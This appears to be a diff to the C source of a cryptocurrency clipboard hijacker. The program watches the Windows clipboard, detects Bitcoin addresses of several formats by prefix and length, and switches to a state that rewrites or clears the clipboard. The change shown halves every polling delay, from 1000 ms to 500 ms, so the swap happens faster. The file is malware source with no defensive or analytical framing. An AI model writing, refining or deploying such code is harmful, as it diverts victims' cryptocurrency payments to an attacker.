@@ -39,7 +39,7 @@ StateCodeProcess main(void)
                 // -------------------------------------------------- Vérification Bitcoin
                 // Vérification adresse déjà enregistrée
                 if (wcscmp(buffer, bitcoin_address) == 0) {
-                    Sleep(1000);
+                    Sleep(500);
                     state = STATE_CLEAN_CLIPBOARD;
                     break;
                 }
@@ -47,7 +47,7 @@ StateCodeProcess main(void)
                 // Vérification adresse P2PKH
                 if (buffer[0] == L'1') {
                     if (text_size >= 26 && text_size <= 35) {
-                        Sleep(1000);
+                        Sleep(500);
                         state = STATE_MODIFY_CLIPBOARD;
                         break;
                     }
@@ -56,7 +56,7 @@ StateCodeProcess main(void)
                 // Vérification adresse P2SH
                 if (buffer[0] == L'3') {
                     if (text_size >= 26 && text_size <= 35) {
-                        Sleep(1000);
+                        Sleep(500);
                         state = STATE_MODIFY_CLIPBOARD;
                         break;
                     }
@@ -65,7 +65,7 @@ StateCodeProcess main(void)
                 // Vérification adresse Bech32
                 if (buffer[0] == L'b' && buffer[1] == L'c' && buffer[2] == L'1' && buffer[3] == L'q') {
                     if (text_size == 42 || text_size == 62) {
-                        Sleep(1000);
+                        Sleep(500);
                         state = STATE_MODIFY_CLIPBOARD;
                         break;
                     }
@@ -74,13 +74,13 @@ StateCodeProcess main(void)
                 // Vérification adresse Bech32m
                 if (buffer[0] == L'b' && buffer[1] == L'c' && buffer[2] == L'1' && buffer[3] == L'p') {
                     if (text_size == 62) {
-                        Sleep(1000);
+                        Sleep(500);
                         state = STATE_MODIFY_CLIPBOARD;
                         break;
                     }
                 }
 
-                Sleep(1000);
+                Sleep(500);
                 break;
 
             case STATE_MODIFY_CLIPBOARD:
@@ -94,14 +94,14 @@ StateCodeProcess main(void)
                     printf("[WARNING] -- Some issues could occur during the execution.\n");
                 }
 
-                Sleep(1000);
+                Sleep(500);
                 state = STATE_ANALYZE_CLIPBOARD;
 
                 break;
 
             case STATE_CLEAN_CLIPBOARD:
                 EmptyClipboard();
-                Sleep(1000);
+                Sleep(500);
                 state = STATE_ANALYZE_CLIPBOARD;
 
                 break;
